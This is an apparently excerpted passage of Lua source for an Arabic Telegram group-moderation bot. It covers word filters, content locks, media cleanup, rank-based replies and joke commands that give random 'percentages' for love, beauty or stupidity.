Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevRio:del(Latvia..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Latvia..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(Latvia..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevRio:set(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevRio:get(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevRio:del(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevRio:del(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevRio:hset(Latvia..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevRio:set(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevRio:get(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevRio:del(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevRio:hget(Latvia..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevRio:del(Latvia.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevRio:hdel(Latvia..'Rio:Filters:'..msg.chat_id_, text)
...
local gps = DevRio:scard(Latvia.."Rio:Groups") local users = DevRio:scard(Latvia.."Rio:Users") 
...
local users = DevRio:scard(Latvia.."Rio:Users")
...
local gps = DevRio:scard(Latvia.."Rio:Groups")
...
if not DevRio:get(Latvia..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevRio:setex(Latvia..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevRio:smembers(Latvia.."Rio:Users")
local sendok = 0
for i = 1, #pv do
...
DevRio:srem(Latvia.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevRio:smembers(Latvia.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevRio:srem(Latvia.."Rio:Groups",group[i]) 
...
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد الكروبات الان ↫ { '..#group..' }'..Latviagp1..Latviagp2..'\n᥀︙العدد الحقيقي الان  ↫ ( '..Latviagp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:CleanNum'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:CleanNum'..msg.chat_id_) 
end
...
DevRio:set(Latvia..'Rio:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevRio:get(Latvia..'Rio:Lock:CleanNum'..msg.chat_id_) then
if DevRio:get(Latvia..'Rio:CleanNum'..msg.chat_id_) then CleanNum = DevRio:get(Latvia..'Rio:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevRio:scard(Latvia.."Rio:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevRio:smembers(Latvia.."Rio:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(Latvia.."Rio:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevRio:get(Latvia..'Rio:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevRio:scard(Latvia.."Rio:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M.."\n᥀︙الحذف التلقائي ↫ "..(DevRio:get(Latvia..'Rio:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevRio:get(Latvia..'Rio:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevRio:scard(Latvia.."Rio:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevRio:del(Latvia.."Rio:cleaner"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل مسح الاغاني بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevRio:get(Latvia..'Rio:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevRio:scard(Latvia.."Rio:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevRio:smembers(Latvia.."Rio:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(Latvia.."Rio:cleanermusic"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source Latvia     --
...
if DevRio:get(Latvia..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التعديل")  
DevRio:del(Latvia..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
...
DevRio:del(Latvia.."Rio:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevRio:hdel(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevRio:get(Latvia..'Rio:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التثبيت")  
DevRio:del(Latvia..'Rio:Lock:Pin'..msg.chat_id_)
DevRio:srem(Latvia.."Rio:Lock:Pinpin",msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Text'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Photo'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevRio:get(Latvia..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكلايش")  
DevRio:del(Latvia..'Rio:Lock:Spam'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Join'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Videos'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Document'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Inline'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Markdown'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Gifs'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Music'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Voice'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Links'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Location'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Tags'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Hashtak'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Contact'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:WebLinks'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Arabic'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:English'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:TagServr'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Stickers'..msg.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Lock:Forwards'..msg.chat_id_)
else
...
DevRio:set(Latvia.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(Latvia..Lock..msg.chat_id_,true)
end
...
DevRio:del(Latvia..UnLock..msg.chat_id_)
end
...
DevRio:del(Latvia..'Rio:Lock:Fshar'..msg.chat_id_) DevRio:del(Latvia..'Rio:Lock:Taf'..msg.chat_id_) DevRio:del(Latvia..'Rio:Lock:Kfr'..msg.chat_id_) 
DevRio:set(Latvia.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevRio:set(Latvia..'Rio:Lock:Fshar'..msg.chat_id_,true) DevRio:set(Latvia..'Rio:Lock:Taf'..msg.chat_id_,true) DevRio:set(Latvia..'Rio:Lock:Kfr'..msg.chat_id_,true) DevRio:hdel(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevRio:set(Latvia..'Rio:Spam:Text'..msg.chat_id_,SetSpam)
...
DevRio:set(Latvia.."Rio:SudoBot:Rd"..msg.chat_id_,Text)
...
DevRio:set(Latvia.."Rio:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(Latvia.."Rio:Constructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(Latvia.."Rio:Managers:Rd"..msg.chat_id_,Text) 
...
DevRio:set(Latvia.."Rio:Admins:Rd"..msg.chat_id_,Text)
...
DevRio:set(Latvia.."Rio:VipMem:Rd"..msg.chat_id_,Text)
...
DevRio:set(Latvia.."Rio:Cleaner:Rd"..msg.chat_id_,Text)
...
DevRio:set(Latvia.."Rio:mem:Rd"..msg.chat_id_,Text)
...
DevRio:del(Latvia.."Rio:mem:Rd"..msg.chat_id_)
DevRio:del(Latvia.."Rio:Cleaner:Rd"..msg.chat_id_)
DevRio:del(Latvia.."Rio:VipMem:Rd"..msg.chat_id_)
DevRio:del(Latvia.."Rio:Admins:Rd"..msg.chat_id_)
DevRio:del(Latvia.."Rio:Managers:Rd"..msg.chat_id_)
DevRio:del(Latvia.."Rio:Constructor:Rd"..msg.chat_id_)
DevRio:del(Latvia.."Rio:BasicConstructor:Rd"..msg.chat_id_)
DevRio:del(Latvia.."Rio:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source Latvia     --
...
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_, v)
end 
...
DevRio:del(Latvia..'Rio:Filters:'..msg.chat_id_)
DevRio:del(Latvia..'Rio:Filters:'..msg.chat_id_)
DevRio:del(Latvia.."Rio:FilterAnimation"..msg.chat_id_)
DevRio:del(Latvia.."Rio:FilterPhoto"..msg.chat_id_)
DevRio:del(Latvia.."Rio:FilterSteckr"..msg.chat_id_)
end
...
DevRio:del(Latvia..'Rio:Ban:'..msg.chat_id_) DevRio:del(Latvia..'Rio:Admins:'..msg.chat_id_) DevRio:del(Latvia..'User:Donky:'..msg.chat_id_) DevRio:del(Latvia..'Rio:VipMem:'..msg.chat_id_) DevRio:del(Latvia..'Rio:Filters:'..msg.chat_id_) DevRio:del(Latvia..'Rio:Muted:'..msg.chat_id_)
...
local basicconstructor = DevRio:smembers(Latvia..'Rio:BasicConstructor:'..msg.chat_id_)
local constructor = DevRio:smembers(Latvia..'Rio:Constructor:'..msg.chat_id_)
local Managers = DevRio:smembers(Latvia..'Rio:Managers:'..msg.chat_id_)
local admins = DevRio:smembers(Latvia..'Rio:Admins:'..msg.chat_id_)
local vipmem = DevRio:smembers(Latvia..'Rio:VipMem:'..msg.chat_id_)
local donky = DevRio:smembers(Latvia..'User:Donky:'..msg.chat_id_)
...
spam_c = DevRio:get(Latvia..'Rio:Spam:Text'..msg.chat_id_)
end
--     Source Latvia     --
if DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source Latvia     --
if DevRio:get(Latvia.."Rio:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevRio:get(Latvia.."Rio:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevRio:get(Latvia.."Rio:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source Latvia     --
if DevRio:get(Latvia..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevRio:get(Latvia..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevRio:get(Latvia.."Rio:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevRio:get(Latvia..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevRio:get(Latvia..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevRio:get(Latvia..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevRio:get(Latvia..'Rio:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevRio:hget(Latvia.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source Latvia     --
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Antk:Rio'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Antk:Rio'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevRio:get(Latvia..'Rio:Antk:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source Latvia     --
if DevRio:get(Latvia..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevRio:del(Latvia..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Latvia..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(Latvia..'Rio:rules'..msg.chat_id_,text)
...
DevRio:set(Latvia..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevRio:get(Latvia..'Rio:rules'..msg.chat_id_)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Zrf:Rio'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الزخرفه بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Zrf:Rio'..msg.chat_id_,true)  
end
if DevRio:get(Latvia..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الزخرفه', 1, 'md')
DevRio:del(Latvia..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevRio:get(Latvia..'Rio:Zrf:Rio'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevRio:setex(Latvia.."Zrf:Rio"..msg.chat_id_..msg.sender_user_id_,300,true)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Brg:Rio'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الابراج بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Brg:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Latvia..'Rio:Brg:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Nsba:Rio'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Nsba:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Latvia..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevRio:set(Latvia..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevRio:get(Latvia..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الحب ', 1, 'md')
DevRio:del(Latvia..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevRio:set(Latvia..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevRio:get(Latvia..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevRio:del(Latvia..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Latvia..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevRio:get(Latvia..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevRio:del(Latvia..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Latvia..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevRio:get(Latvia..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الكره ', 1, 'md')
DevRio:del(Latvia..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Latvia..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevRio:get(Latvia..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevRio:del(Latvia..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Latvia..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevRio:get(Latvia..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevRio:del(Latvia..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Latvia..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevRio:get(Latvia..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevRio:del(Latvia..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Age:Rio'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
